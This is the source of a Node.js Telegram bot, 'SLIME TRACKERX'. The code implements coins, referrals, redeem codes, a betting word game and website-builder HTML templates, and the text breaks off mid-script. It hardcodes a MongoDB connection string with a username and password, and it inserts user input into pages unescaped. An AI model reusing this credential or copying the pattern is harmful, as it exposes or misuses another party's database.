// =====================================================
// 🎮🔥 SLIME TRACKERX v40.1 - WITH LINK EXPIRY 🔥🎮
// =====================================================

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");
const mongoose = require("mongoose");
const fs = require("fs-extra");
const multer = require("multer");
const axios = require("axios");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ========== BOT CONFIG ==========
const DOMAIN = "https://virtualnumbersfree.onrender.com";
const CHANNEL = "@devxtechzone";
const OWNER_ID = 7271063368;

// ========== ECONOMY ==========
const WEB_PRICE = 15;
const TRACK_COST = 15;
const NEW_COINS = 15;
const REF_REWARD = 10;
const DAILY_REWARD = 10;
const WORK_REWARD = 5;
const WORD_MIN_BET = 5;
const WORD_MAX_BET = 500;

// ========== WORD DIFFICULTY ==========
const difficulties = {
  easy: { name: "🍃 EASY", timer: 45, letters: 3, multiplier: 1 },
  medium: { name: "⚡ MEDIUM", timer: 30, letters: 5, multiplier: 2 },
  hard: { name: "🔥 HARD", timer: 15, letters: 7, multiplier: 3 },
  expert: { name: "💀 EXPERT", timer: 8, letters: 9, multiplier: 5 }
};

// ========== WORD DATABASE ==========
const wordsByLength = {
  3: ["CAT", "DOG", "SUN", "CAR", "BAG", "HAT", "LEG", "EYE", "CUP", "BED", "RED", "HOT", "BIG", "NEW", "OLD", "FUN", "RUN", "SIT", "EAT", "FLY", "CRY", "JOY", "SAD", "WET", "DRY", "FAT", "RAT", "BAT", "MAT", "PAT", "SAT", "HEN", "PEN", "DEN", "MEN", "TEN", "NET", "PET", "GET", "JET", "SET", "BET", "LET", "MET", "YET", "ZIP", "LIP", "TIP", "HIP", "DIP", "RIP", "SIP", "NIP", "MAP", "CAP", "TAP", "GAP", "LAP", "SAP", "NAP", "VAN", "MAN", "CAN", "PAN", "FAN", "BAN", "RAN", "WAN", "HIT", "KIT", "BIT", "FIT", "PIT", "WIT", "ROW", "COW", "HOW", "NOW", "LOW", "BOW", "TOW", "TOY", "BOY", "DAY", "WAY", "PAY", "SAY", "KEY", "HEY", "ICE", "ACE", "AGE", "ARE", "AND", "END", "INK", "OWL", "EAR", "ARM", "ANT", "WEB", "LAB", "CAB", "JAB", "TUB", "SUB", "RUB", "CUB", "PUB", "HUB"],
  4: ["FISH", "BIRD", "FROG", "STAR", "MOON", "TREE", "WIND", "FIRE", "ROCK", "SAND", "SHIP", "KING", "RING", "SING", "WING", "BOOK", "COOK", "LOOK", "LION", "BEAR", "WOLF", "DEER", "GOAT", "DUCK", "SWAN", "SEAL", "ROAD", "PATH", "WALL", "DOOR", "ROOF", "ROOM", "HALL", "YARD", "GATE", "FARM", "BLUE", "PINK", "GRAY", "GOLD", "SILK", "WOOL", "CASH", "COIN", "NOTE", "BANK", "TIME", "YEAR", "WEEK", "HOUR", "MATH", "CODE", "DATA", "FILE", "FORM", "PLAY", "GAME", "TEAM", "GOAL", "PASS", "KICK", "RACE", "JUMP", "DIVE", "SWIM", "FOOD", "RICE", "MEAT", "CAKE", "SOUP", "EGGS", "SALT", "SPIN", "RAIN", "SNOW", "HEAT", "COLD", "MIST", "FOG", "HAIL", "CLAY", "HAND", "HEAD", "FOOT", "NOSE", "MOUTH", "TEETH", "HAIR", "BELL", "FORK", "SPOON", "KNIFE", "PLATE", "BOWL", "CUPID", "ANGEL", "DEVIL", "GHOST", "SPIRIT", "SOUL", "HEART", "BRAIN", "LUNG", "KIDNEY", "LIVER"],
  5: ["APPLE", "MANGO", "GRAPE", "BERRY", "PEACH", "LEMON", "MELON", "GUAVA", "OLIVE", "PLUMS", "HOUSE", "TABLE", "CHAIR", "COUCH", "SHELF", "PLATE", "GLASS", "SPOON", "FORKS", "KNIFE", "HAPPY", "SMART", "BRAVE", "CALM", "KIND", "PROUD", "SHARP", "QUICK", "SWEET", "TOUGH", "LIGHT", "CLEAR", "CLEAN", "DIRTY", "FRESH", "DRIED", "SOFT", "HARD", "BRISK", "SOLID", "WATER", "RIVER", "OCEAN", "LAKES", "BEACH", "SHORE", "WAVES", "TIDES", "DEPTH", "FLOAT", "PLANT", "GRASS", "TREES", "LEAFY", "ROOTS", "BLOOM", "FRUIT", "SEEDS", "GREEN", "GROWN", "MONEY", "VALUE", "PRICE", "COSTS", "SPEND", "SAVES", "LOANS", "TRADE", "STOCK", "BANKS", "POWER", "FORCE", "SPEED", "MOTOR", "DRIVE", "WHEEL", "TRACK", "ROUTE", "PATHS", "WORLD", "EARTH", "SPACE", "STARS", "PLANE", "ROBOT", "DRONE", "ORBIT", "SOLAR", "PEACE", "UNITY", "HUMAN", "HEART", "BRAIN", "MUSIC", "DANCE", "COLOR", "BLACK", "WHITE", "BROWN", "GREEN", "YELLOW", "PURPLE", "ORANGE", "SILVER", "GOLDEN", "BRONZE", "COPPER", "MARBLE", "IVORY"],
  6: ["BANANA", "ORANGE", "PURPLE", "YELLOW", "SILVER", "GOLDEN", "BRONZE", "COPPER", "MARBLE", "IVORY", "RABBIT", "TIGER", "EAGLE", "SHARK", "WHALE", "ZEBRA", "SNAKE", "WOLF", "BEAR", "FOX", "HORSE", "CATTLE", "SHEEP", "GOAT", "CHICK", "DUCK", "TURKEY", "PIGEON", "CROWD", "SPARROW", "BUTTER", "CHEESE", "BREAD", "SUGAR", "SALT", "PEPPER", "HONEY", "MILK", "COFFEE", "TEA", "JUICE", "WATER", "DRINK", "SMOOTH", "BITTER", "SWEET", "FLAVOR", "TASTE", "DINNER", "LUNCH", "GARDEN", "PALACE", "CASTLE", "TEMPLE", "CHURCH", "MOSQUE", "SCHOOL", "COLLEGE", "OFFICE", "MARKET", "STREET", "AVENUE", "HIGHWAY", "BRIDGE", "TUNNEL", "STATION", "AIRPORT", "HARBOR", "CENTER", "PLAZA", "PLAYER", "DRIVER", "WRITER", "READER", "SINGER", "DANCER", "ACTOR", "MAKER", "CREATE", "DESIGN", "CODING", "DEBUG", "SYSTEM", "SERVER", "CLIENT", "NETWORK", "SECURE", "ACCESS", "MEMORY", "STORED", "FUTURE", "PAST", "PRESENT", "HISTORY", "SCIENCE", "ART", "MUSIC", "DANCE", "SPORT", "GAME", "FUN", "JOY", "LOVE", "HATE", "FEAR", "HOPE", "DREAM", "GOAL", "SUCCESS", "FAILURE", "PROGRESS", "CHANGE", "GROWTH"],
  7: ["ANIMALS", "FARMERS", "HUNTERS", "FISHERS", "DRIVERS", "PLAYERS", "WRITERS", "READERS", "SINGERS", "DANCERS", "TEACHER", "STUDENT", "DOCTORS", "LAWYERS", "BANKERS", "WORKERS", "LEADERS", "MANAGER", "OFFICER", "AGENTS", "FREEDOM", "JUSTICE", "COURAGE", "LOYALTY", "HONESTY", "KINDNESS", "HAPPILY", "SADNESS", "MADNESS", "GOODMAN", "NETWORK", "SYSTEMS", "PROGRAM", "CODINGS", "DEBUGGS", "SERVERS", "CLIENTS", "SECURES", "STORAGE", "PROCESS", "COUNTRY", "VILLAGE", "CITIES", "MARKETS", "SHOPS", "MALLS", "STORES", "HOUSES", "BUILDNG", "FASHION", "CLOTHES", "SHIRTS", "TROUSER", "JACKETS", "SHOES", "SANDALS", "HATS", "BELTS", "WATCHES", "WEATHER", "RAINING", "SNOWING", "SUNRISE", "SUNSETS", "STORMS", "THUNDER", "BREEZES", "CLIMATE", "SEASONS", "ANCIENT", "MODERNS", "FUTURES", "HISTORY", "BIOLOGY", "PHYSICS", "CHEMIST", "MATHS", "LOGICAL", "NATURAL", "SOCIAL", "CULTURE", "LANGUAGE", "ENGLISH", "SPANISH", "FRENCH", "GERMAN", "ITALIAN", "RUSSIAN", "CHINESE", "JAPANESE", "KOREAN", "ARABIC", "HINDI", "BENGALI", "PORTUGUESE", "DUTCH", "POLISH", "TURKISH", "VIETNAMESE", "THAI"],
  8: ["ELEPHANT", "GIRAFFES", "KANGAROO", "DOLPHINS", "PENGUINS", "COMPUTER", "KEYBOARD", "MONITOR", "PRINTER", "SCANNER", "ROUTERS", "NETWORKS", "DATABASE", "SOFTWARE", "HARDWARE", "SECURITY", "FIREWALL", "INTERNET", "BROWSERS", "PROGRAMS", "BEAUTIFUL", "WONDERFUL", "EXCITING", "ADVENTURE", "MYSTERY", "JOURNEY", "DISCOVER", "EXPLORE", "CHALLENGE", "VICTORY", "STRENGTH", "COURAGES", "FRIENDSH", "HAPPINES", "POWERFUL", "CREATIVE", "THINKING", "LEARNING", "TEACHING", "BUILDING", "PLANNING", "STRATEGY", "BUSINESS", "MARKETING", "FINANCES", "ECONOMY", "INDUSTRY", "COMPANYS", "PRODUCTS", "SERVICES", "CUSTOMER", "SUPPORTS", "DELIVERY", "LOGISTICS", "MANAGERS", "LEADERSH", "TEAMWORK", "SUCCESSS", "FAILURES", "PROGRESS", "MOTIVATION", "INSPIRATION", "CREATIVITY", "INNOVATION", "TECHNOLOGY", "EDUCATION", "KNOWLEDGE", "WISDOM", "INTELLIGENT", "BRILLIANT", "EXCELLENT", "OUTSTANDING", "REMARKABLE", "EXTRAODINARY", "PHENOMENAL", "SPECTACULAR", "MAGNIFICENT", "FANTASTIC", "INCREDIBLE", "UNBELIEVABLE", "ASTONISHING", "AMAZING", "AWESOME", "FABULOUS", "MARVELOUS", "TERRIFIC", "WONDERFUL", "SUPERB", "SUPREME", "ULTIMATE", "PERFECT", "IDEAL", "FLAWLESS", "IMMACULATE", "PRISTINE", "SPOTLESS"],
  9: ["INCREDIBLE", "IMPORTANT", "DIFFERENT", "INTERESTS", "KNOWLEDGE", "EDUCATION", "DEVELOPER", "HAPPINESS", "BEAUTIFUL", "POWERFULL", "CREATIVES", "STRONGEST", "BRIGHTEST", "COMPUTERS", "PROGRAMER", "SOFTWARES", "DATABASES", "NETWORKED", "SECURITYS", "FIREWALLS", "INTERNETS", "BROWSINGS", "MARKETING", "FINANCIAL", "BUSINESSS", "INDUSTRYS", "COMPANIES", "PRODUCTLY", "SERVICESS", "CUSTOMERS", "SUPPORTLY", "DELIVERYS", "LOGISTICS", "MANAGEMENT", "LEADERSHP", "TEAMWORKS", "SUCCESSES", "FAILURES", "PROGRESSES", "STRATEGYS", "OPERATIONS", "PLANNINGS", "TECHNOLOGY", "INNOVATION", "CREATIVITY", "MOTIVATION", "INSPIRATION", "DETERMINED", "PASSIONATE", "DISCIPLINE", "COMMITMENT", "EXCELLENCE", "QUALITY", "INTEGRITY", "AUTHENTIC", "GENUINE", "HONESTY", "RESPECT", "VALUE", "PURPOSE", "VISION", "MISSION", "STRATEGIC", "ANALYTICAL", "SYSTEMATIC", "METHODICAL", "ORGANIZED", "EFFICIENT", "EFFECTIVE", "DYNAMIC", "ENERGETIC", "ENTHUSIASTIC", "MOTIVATED", "INSPIRED", "CREATIVE", "INNOVATIVE", "RESOURCEFUL", "INGENIOUS", "INVENTIVE", "ORIGINAL", "UNIQUE", "DISTINCT", "SPECIAL", "EXTRAORDINARY", "REMARKABLE", "EXCEPTIONAL", "PHENOMENAL", "SPECTACULAR", "MAGNIFICENT", "FANTASTIC", "TERRIFIC", "WONDERFUL", "MARVELOUS", "SUPERB", "SUPREME", "ULTIMATE", "PERFECT", "IDEAL"]
};

// ========== FILE SETUP ==========
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, 'uploads/'),
  filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
});
const upload = multer({ storage, limits: { fileSize: 10 * 1024 * 1024 } });

app.use(bodyParser.json({ limit: "100mb" }));
app.use(express.static("public"));
app.use("/uploads", express.static("uploads"));

fs.ensureDirSync("uploads");
fs.ensureDirSync("exports");
fs.ensureDirSync("public");

// ========== MONGODB ==========
const MONGODB_URI = "mongodb+srv://mrdev:dev091339@cluster0.grjlq7v.mongodb.net/trackerx?retryWrites=true&w=majority";

mongoose.connect(MONGODB_URI)
  .then(() => console.log('✅ MongoDB Connected'))
  .catch(err => console.error('❌ MongoDB Error:', err));

// ========== SCHEMAS ==========
const userSchema = new mongoose.Schema({
  userId: { type: Number, unique: true },
  coins: { type: Number, default: 15 },
  diamonds: { type: Number, default: 0 },
  referrals: { type: Number, default: 0 },
  referrer: { type: Number, default: null },
  level: { type: Number, default: 1 },
  xp: { type: Number, default: 0 },
  streak: { type: Number, default: 0 },
  lastDaily: Date,
  wins: { type: Number, default: 0 },
  losses: { type: Number, default: 0 },
  wordWins: { type: Number, default: 0 },
  wordLosses: { type: Number, default: 0 },
  hacks: { type: Number, default: 0 },
  websites: { type: [Object], default: [] },
  isAdmin: { type: Boolean, default: false },
  badges: { type: [String], default: ["🎁 Newbie"] },
  lastActive: { type: Date, default: Date.now }
});

const codeSchema = new mongoose.Schema({
  code: { type: String, unique: true },
  coins: Number,
  diamonds: { type: Number, default: 0 },
  usedBy: [Number],
  maxUses: { type: Number, default: 20 },
  left: Number,
  expire: Date
});

const websiteSchema = new mongoose.Schema({
  name: String,
  ownerId: Number,
  template: String,
  content: Object,
  url: String,
  views: { type: Number, default: 0 },
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);
const Code = mongoose.model('Code', codeSchema);
const Website = mongoose.model('Website', websiteSchema);

// ========== CACHE ==========
let usersCache = new Map();
let codesCache = new Map();
let webBuilds = new Map();
let bannedUsers = new Set();
let workCD = new Map();
let wordChallenges = new Map();
let hackTokens = new Map();
let processedMessages = new Set();

// ========== DATABASE FUNCTIONS ==========
async function loadData() {
  const users = await User.find({});
  users.forEach(u => usersCache.set(u.userId, u));
  const codes = await Code.find({ expire: { $gt: new Date() } });
  codes.forEach(c => codesCache.set(c.code, c));
  console.log(`📂 Loaded ${usersCache.size} users, ${codesCache.size} codes`);
}

async function saveUser(userId, data) {
  await User.findOneAndUpdate({ userId }, data, { upsert: true });
  usersCache.set(userId, data);
}

async function initUser(userId, referrerId = null) {
  let user = usersCache.get(userId);
  if (!user) {
    user = {
      userId,
      coins: NEW_COINS,
      diamonds: 0,
      referrals: 0,
      referrer: referrerId,
      level: 1,
      xp: 0,
      streak: 0,
      lastDaily: null,
      wins: 0,
      losses: 0,
      wordWins: 0,
      wordLosses: 0,
      hacks: 0,
      websites: [],
      isAdmin: userId === OWNER_ID,
      badges: ["🎁 Newbie"],
      lastActive: new Date()
    };
    await saveUser(userId, user);
    
    if (referrerId && referrerId !== userId) {
      let referrer = usersCache.get(referrerId);
      if (referrer) {
        referrer.coins += REF_REWARD;
        referrer.referrals++;
        await saveUser(referrerId, referrer);
        bot.telegram.sendMessage(referrerId, `🎉 New Referral! +${REF_REWARD} coins`);
      }
    }
  }
  return user;
}

async function addCoin(userId, amount) {
  let user = usersCache.get(userId);
  if (user) {
    user.coins += amount;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function takeCoin(userId, amount) {
  let user = usersCache.get(userId);
  if (user && user.coins >= amount) {
    user.coins -= amount;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function addXP(userId, amount) {
  let user = usersCache.get(userId);
  if (user) {
    user.xp += amount;
    let needed = user.level * 100;
    if (user.xp >= needed) {
      user.xp -= needed;
      user.level++;
      let reward = user.level * 5;
      user.coins += reward;
      await saveUser(userId, user);
      bot.telegram.sendMessage(userId, `🎉 LEVEL UP! Level ${user.level}! +${reward} COINS`);
    } else {
      await saveUser(userId, user);
    }
  }
}

async function getUsername(userId) {
  try {
    let chat = await bot.telegram.getChat(userId);
    return chat.username || `User_${userId}`;
  } catch {
    return `User_${userId}`;
  }
}

function refLink(id) {
  return `https://t.me/${bot.botInfo?.username || 'SlimeTrackerXBot'}?start=ref_${id}`;
}

// ========== FIXED FORCE JOIN FUNCTION ==========
async function checkJoin(ctx) {
  try {
    let chatMember = await ctx.telegram.getChatMember(CHANNEL, ctx.from.id);
    let allowedStatuses = ["creator", "administrator", "member", "restricted"];
    let isMember = allowedStatuses.includes(chatMember.status);
    
    // Debug log (remove in production)
    console.log(`🔍 User ${ctx.from.id} (${ctx.from.first_name}): Status = ${chatMember.status}, Member = ${isMember}`);
    
    return isMember;
  } catch (error) {
    console.log(`❌ CheckJoin error for ${ctx.from.id}:`, error.message);
    return false;
  }
}

// ========== REDEEM CODE ==========
async function genCode(coins, diamonds = 0, uses = 20, hours = 24) {
  let code = crypto.randomBytes(6).toString("hex").toUpperCase();
  let expire = new Date(Date.now() + (hours * 3600000));
  
  let codeData = new Code({
    code, coins, diamonds,
    usedBy: [],
    maxUses: uses,
    left: uses,
    expire
  });
  
  await codeData.save();
  codesCache.set(code, codeData);
  return code;
}

async function redeemCode(userId, code) {
  let c = codesCache.get(code.toUpperCase());
  if (!c) return { ok: false, msg: "❌ Invalid code!" };
  if (Date.now() > c.expire) return { ok: false, msg: "❌ Code expired!" };
  if (c.left <= 0) return { ok: false, msg: "❌ Code used up!" };
  if (c.usedBy.includes(userId)) return { ok: false, msg: "❌ Already used!" };
  
  await addCoin(userId, c.coins);
  if (c.diamonds > 0) {
    let user = usersCache.get(userId);
    user.diamonds += c.diamonds;
    await saveUser(userId, user);
  }
  
  c.usedBy.push(userId);
  c.left--;
  await c.save();
  codesCache.set(c.code, c);
  
  return { ok: true, msg: `✅ +${c.coins} coins!${c.diamonds > 0 ? ` +${c.diamonds}💎` : ''}` };
}

// ========== DOPE HTML TEMPLATES (ULTRA MODERN) ==========
const htmlTemplates = {
  portfolio: (data) => `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${data.name || 'Portfolio'} | Dope AF 🔥</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #0a0a0a;
            color: #fff;
            overflow-x: hidden;
        }
        .cursor { width: 20px; height: 20px; border: 2px solid #00ff88; border-radius: 50%; position: fixed; pointer-events: none; z-index: 9999; transition: 0.1s; }
        .cursor-follower { width: 40px; height: 40px; border: 1px solid rgba(0,255,136,0.5); border-radius: 50%; position: fixed; pointer-events: none; z-index: 9998; transition: 0.2s; }
        .noise::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-radial-gradient(circle, #000, #000 2px, transparent 2px, transparent 4px);
            opacity: 0.05;
            pointer-events: none;
            z-index: 9997;
        }
        nav {
            position: fixed;
            top: 0;
            width: 100%;
            padding: 20px 40px;
            background: rgba(10,10,10,0.95);
            backdrop-filter: blur(10px);
            z-index: 100;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(0,255,136,0.2);
        }
        .logo {
            font-size: 28px;
            font-weight: 900;
            background: linear-gradient(135deg, #00ff88, #00bfff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .nav-links a {
            color: #fff;
            text-decoration: none;
            margin-left: 30px;
            transition: 0.3s;
            position: relative;
        }
        .nav-links a::after {
            content: '';
            position: absolute;
            bottom: -5px;
            left: 0;
            width: 0%;
            height: 2px;
            background: #00ff88;
            transition: 0.3s;
        }
        .nav-links a:hover::after { width: 100%; }
        .nav-links a:hover { color: #00ff88; }
        .hero {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        .hero::before {
            content: '';
            position: absolute;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(0,255,136,0.1) 0%, transparent 70%);
            animation: rotate 20s linear infinite;
        }
        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        .hero-content {
            z-index: 1;
            animation: fadeInUp 1s ease;
        }
        .hero h1 {
            font-size: 80px;
            font-weight: 900;
            background: linear-gradient(135deg, #fff, #00ff88, #00bfff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 20px;
        }
        .hero p {
            font-size: 24px;
            opacity: 0.9;
            margin-bottom: 40px;
        }
        .btn {
            display: inline-block;
            padding: 15px 40px;
            background: linear-gradient(135deg, #00ff88, #00bfff);
            color: #0a0a0a;
            text-decoration: none;
            border-radius: 50px;
            font-weight: 700;
            transition: 0.3s;
            position: relative;
            overflow: hidden;
        }
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: 0.5s;
        }
        .btn:hover::before { left: 100%; }
        .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(0,255,136,0.3); }
        .section {
            padding: 100px 40px;
            max-width: 1200px;
            margin: 0 auto;
        }
        .section-title {
            font-size: 48px;
            text-align: center;
            margin-bottom: 60px;
            background: linear-gradient(135deg, #fff, #00ff88);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .skills {
            display: flex;
            justify-content: center;
            gap: 20px;
            flex-wrap: wrap;
        }
        .skill {
            background: rgba(0,255,136,0.1);
            padding: 15px 30px;
            border-radius: 50px;
            border: 1px solid rgba(0,255,136,0.3);
            backdrop-filter: blur(10px);
            transition: 0.3s;
        }
        .skill:hover {
            transform: translateY(-5px);
            background: rgba(0,255,136,0.2);
            box-shadow: 0 5px 20px rgba(0,255,136,0.2);
        }
        .projects {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
            margin-top: 40px;
        }
        .project-card {
            background: rgba(255,255,255,0.05);
            border-radius: 20px;
            padding: 30px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
            transition: 0.3s;
            cursor: pointer;
        }
        .project-card:hover {
            transform: translateY(-10px);
            border-color: #00ff88;
            box-shadow: 0 10px 30px rgba(0,255,136,0.2);
        }
        .project-card i { font-size: 50px; color: #00ff88; margin-bottom: 20px; }
        footer {
            text-align: center;
            padding: 40px;
            border-top: 1px solid rgba(255,255,255,0.1);
        }
        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        @media (max-width: 768px) {
            .hero h1 { font-size: 40px; }
            nav { flex-direction: column; gap: 20px; }
            .nav-links a { margin: 0 15px; }
            .section { padding: 60px 20px; }
            .section-title { font-size: 32px; }
        }
    </style>
</head>
<body>
    <div class="cursor"></div>
    <div class="cursor-follower"></div>
    <div class="noise"></div>
    
    <nav>
        <div class="logo">${data.name || 'PORTFOLIO'}</div>
        <div class="nav-links">
            <a href="#">Home</a>
            <a href="#">Work</a>
            <a href="#">About</a>
            <a href="#">Contact</a>
        </div>
    </nav>
    
    <div class="hero">
        <div class="hero-content">
            <h1>${data.name || 'Creative Developer'}</h1>
            <p>${data.title || 'Building the future, one line at a time'}</p>
            <a href="#" class="btn">View Work <i class="fas fa-arrow-right"></i></a>
        </div>
    </div>
    
    <div class="section">
        <h2 class="section-title">⚡ Skills & Expertise</h2>
        <div class="skills">
            <div class="skill"><i class="fab fa-js"></i> ${data.skill1 || 'JavaScript'}</div>
            <div class="skill"><i class="fab fa-react"></i> ${data.skill2 || 'React.js'}</div>
            <div class="skill"><i class="fab fa-node"></i> ${data.skill3 || 'Node.js'}</div>
            <div class="skill"><i class="fab fa-python"></i> Python</div>
            <div class="skill"><i class="fas fa-database"></i> MongoDB</div>
        </div>
    </div>
    
    <div class="section">
        <h2 class="section-title">🔥 Featured Projects</h2>
        <div class="projects">
            <div class="project-card">
                <i class="fas fa-globe"></i>
                <h3>Project Nebula</h3>
                <p>Revolutionary web3 platform</p>
            </div>
            <div class="project-card">
                <i class="fas fa-mobile-alt"></i>
                <h3>Project Aurora</h3>
                <p>AI-powered mobile app</p>
            </div>
            <div class="project-card">
                <i class="fas fa-brain"></i>
                <h3>Project Quantum</h3>
                <p>Machine learning solution</p>
            </div>
        </div>
    </div>
    
    <footer>
        <p>📧 ${data.email || 'hello@example.com'}</p>
        <div style="margin-top: 20px;">
            <i class="fab fa-github"></i> &nbsp;&nbsp;
            <i class="fab fa-linkedin"></i> &nbsp;&nbsp;
            <i class="fab fa-twitter"></i> &nbsp;&nbsp;
            <i class="fab fa-instagram"></i>
        </div>
        <p style="margin-top: 20px;">© 2024 ${data.name || 'Portfolio'} | Built with 🔥</p>
    </footer>
    
    <script>
        let cursor = document.querySelector('.cursor');
        let cursorFollower = document.querySelector('.cursor-follower');
        document.addEventListener('mousemove', (e) => {
            cursor.style.left = e.clientX - 10 + 'px';
            cursor.style.top = e.clientY - 10 + 'px';
            cursorFollower.style.left = e.clientX - 20 + 'px';
            cursorFollower.style.top = e.clientY - 20 + 'px';
        });
    </script>
</body>
</html>`,
  
  business: (data) => `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${data.company || 'Business'} | Premium Solutions</title>
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Space Grotesk', sans-serif;
            background: #000;
            color: #fff;
        }
        canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
        }
        .content {
            position: relative;
            z-index: 1;
        }
        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 30px 50px;
            background: rgba(0,0,0,0.8);
            backdrop-filter: blur(10px);
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .logo {
            font-size: 32px;
            font-weight: 700;
            letter-spacing: -1px;
        }
        .logo span { color: #ff3366; }
        .nav-links a {
            color: #fff;
            text-decoration: none;
            margin-left: 40px;
            transition: 0.3s;
        }
        .nav-links a:hover { color: #ff3366; }
        .hero {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 0 20px;
        }
        .hero h1 {
            font-size: 80px;
            font-weight: 700;
            margin-bottom: 20px;
            background: linear-gradient(135deg, #fff, #ff3366, #ff6633);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .hero p {
            font-size: 24px;
            opacity: 0.8;
            margin-bottom: 40px;
        }
        .btn {
            display: inline-block;
            padding: 15px 40px;
            background: #ff3366;
            color: #fff;
            text-decoration: none;
            border-radius: 50px;
            font-weight: 600;
            transition: 0.3s;
            border: none;
            cursor: pointer;
        }
        .btn:hover {
            transform: scale(1.05);
            box-shadow: 0 10px 30px rgba(255,51,102,0.4);
        }
        .services {
            padding: 100px 50px;
            max-width: 1200px;
            margin: 0 auto;
        }
        .services h2 {
            font-size: 48px;
            text-align: center;
            margin-bottom: 60px;
        }
        .service-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
        }
        .service-card {
            background: rgba(255,255,255,0.05);
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            transition: 0.3s;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .service-card:hover {
            transform: translateY(-10px);
            border-color: #ff3366;
        }
        .service-card i {
            font-size: 50px;
            color: #ff3366;
            margin-bottom: 20px;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 30px;
            max-width: 900px;
            margin: 80px auto;
            text-align: center;
        }
        .stat-number {
            font-size: 48px;
            font-weight: 700;
            color: #ff3366;
        }
        footer {
            text-align: center;
            padding: 60px;
            border-top: 1px solid rgba(255,255,255,0.1);
        }
        @media (max-width: 768px) {
            .hero h1 { font-size: 40px; }
            nav { flex-direction: column; gap: 20px; }
            .nav-links a { margin: 0 15px; }
            .stats { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <div class="content">
        <nav>
            <div class="logo"><span>${data.company?.charAt(0) || 'X'}</span>${data.company?.slice(1) || 'Enterprise'}</div>
            <div class="nav-links">
                <a href="#">Home</a>
                <a href="#">Services</a>
                <a href="#">About</a>
                <a href="#">Contact</a>
            </div>
        </nav>
        
        <div class="hero">
            <div>
                <h1>${data.company || 'Future-Ready Solutions'}</h1>
                <p>${data.tagline || 'Transforming businesses with cutting-edge technology'}</p>
                <a href="#" class="btn">Get Started <i class="fas fa-arrow-right"></i></a>
            </div>
        </div>
        
        <div class="services">
            <h2>💼 Premium Services</h2>
            <div class="service-grid">
                <div class="service-card">
                    <i class="fas fa-rocket"></i>
                    <h3>${data.service1 || 'Innovation'}</h3>
                    <p>${data.service1_desc || 'Cutting-edge solutions'}</p>
                </div>
                <div class="service-card">
                    <i class="fas fa-chart-line"></i>
                    <h3>${data.service2 || 'Growth'}</h3>
                    <p>${data.service2_desc || 'Scale your business'}</p>
                </div>
                <div class="service-card">
                    <i class="fas fa-headset"></i>
                    <h3>${data.service3 || 'Support'}</h3>
                    <p>${data.service3_desc || '24/7 dedicated team'}</p>
                </div>
            </div>
        </div>
        
        <div class="stats">
            <div><div class="stat-number">500+</div><div>Projects</div></div>
            <div><div class="stat-number">200+</div><div>Clients</div></div>
            <div><div class="stat-number">98%</div><div>Satisfaction</div></div>
        </div>
        
        <footer>
            <p>📧 ${data.email || 'hello@example.com'}</p>
            <p>📞 ${data.phone || '+1 234 567 8900'}</p>
            <p>📍 ${data.address || 'Global Headquarters'}</p>
            <p style="margin-top: 20px;">© 2024 ${data.company || 'Business'} | All rights reserved</p>
        </footer>
    </div>
    
    <script>
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
